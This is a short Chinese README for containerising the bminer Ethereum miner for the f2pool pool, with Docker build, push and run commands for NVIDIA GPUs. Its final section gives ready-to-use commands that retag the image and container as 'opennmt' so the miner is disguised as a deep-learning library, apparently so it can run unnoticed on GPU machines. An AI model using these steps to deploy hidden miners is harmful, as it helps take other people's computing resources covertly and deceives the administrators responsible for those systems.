# xminer_docker
f2pool矿机容器化部署

## bminer
### 以太坊
构建镜像
```
docker build -f bminer/DockerfileETH -t bminer-eth:latest .
# 将最新镜像push到镜像仓库中
docker tag bminer-eth nanohan/bminer-eth
docker push nanohan/bminer-eth
```
启动容器
```
# 其中 WORKER_NAME可以任意指定，为f2pool中显示的work名称，每台矿机指定不同的WORKER_NAME
docker run --runtime=nvidia -e WORKER_NAME="docker-y" --name eth bminer-eth:latest
```
docker hub 访问，其中opennmt是用来将镜像和容器伪装成深度学习库，可以改成任意伪装的深度学习相关名称
```
docker pull nanohan/bminer-eth:latest
docker tag nanohan/bminer-eth:latest opennmt
docker rmi nanohan/bminer-eth:latest
docker run --runtime=nvidia -e NVIDIA_VISIBLE_DEVICES=1 -e WORKER_NAME="docker-y" --name opennmt opennmt:latest
```
